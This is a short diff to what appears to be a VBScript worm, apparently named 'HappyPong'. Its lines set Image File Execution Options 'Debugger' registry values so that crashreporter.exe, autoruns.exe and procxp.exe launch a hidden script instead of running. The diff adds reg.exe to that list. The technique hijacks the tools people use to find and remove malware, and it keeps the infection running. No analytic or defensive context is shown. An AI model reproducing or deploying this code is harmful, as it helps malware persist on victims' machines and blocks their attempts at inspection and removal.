@@ -38,3 +38,4 @@ Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execu
 Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\crashreporter.exe\Debugger","wscript.exe C:\WINDOWS\HappyPong\ms_g.vbs"
 Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\autoruns.exe\Debugger","wscript.exe C:\WINDOWS\HappyPong\ms_g.vbs"
 Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procxp.exe\Debugger","wscript.exe C:\WINDOWS\HappyPong\ms_g.vbs"
+Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe\Debugger","wscript.exe C:\WINDOWS\HappyPong\ms_g.vbs"
